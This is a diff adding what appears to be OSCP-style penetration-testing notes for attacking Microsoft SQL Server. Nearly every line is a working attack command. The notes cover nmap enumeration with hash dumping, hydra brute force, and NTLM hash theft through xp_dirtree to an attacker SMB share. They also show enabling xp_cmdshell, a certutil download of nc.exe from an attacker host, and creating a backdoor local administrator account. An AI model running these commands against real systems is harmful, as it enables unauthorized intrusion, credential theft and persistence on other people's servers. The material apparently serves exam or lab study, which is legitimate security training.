@@ -1,1 +1,55 @@
+Connect with impacket-mssqlclient
+└─$ impacket-mssqlclient -windows-auth 'oscp/sql_svc@10.10.80.x'  
 
+Get information
+nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
+
+Brute force
+hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mssql -vV -I -u
+
+Having credentials
+mssqlclient.py -windows-auth <DOMAIN>/<USER>:<PASSWORD>@<IP>
+mssqlclient.py <USER>:<PASSWORD>@<IP>
+
+# Once logged in you can run queries:
+SQL> select @@ version;
+
+# Steal NTLM hash
+sudo smbserver.py -smb2support mute .
+SQL> exec master..xp_dirtree '\\<IP>\mute\' # Steal the NTLM hash, crack it with john or hashcat
+
+# Try to enable code execution
+SQL> enable_xp_cmdshell
+
+# Execute code
+SQL> xp_cmdshell whoami /all
+SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<IP>/nc.exe
+
+ms sql client commands
+    > sqsh -S 10.11.1.31 -U sa -P password -D database
+    - Get a list of current databases
+        > SELECT name FROM master.sys.databases
+        > go
+    - EXEC sp_databases
+
+    - Manually enable xp_cmdshell
+        1> SP_CONFIGURE 'show advanced options', 1
+        2> go
+        Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+        (return status = 0)
+        1> reconfigure
+        2> go
+        1> SP_CONFIGURE 'xp_cmdshell', 1
+        2> go
+        Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+        (return status = 0)
+        1> reconfigure
+        2> go
+
+    - Create an admin user
+        > EXEC master..xp_cmdshell 'type C:\Users\Administrator\Desktop\proof.txt'
+        > go
+        > EXEC master..xp_cmdshell 'net user /add cooldude password123'
+        > go
+        > EXEC master..xp_cmdshell 'net localgroup administrators cooldude /add'
+        > go
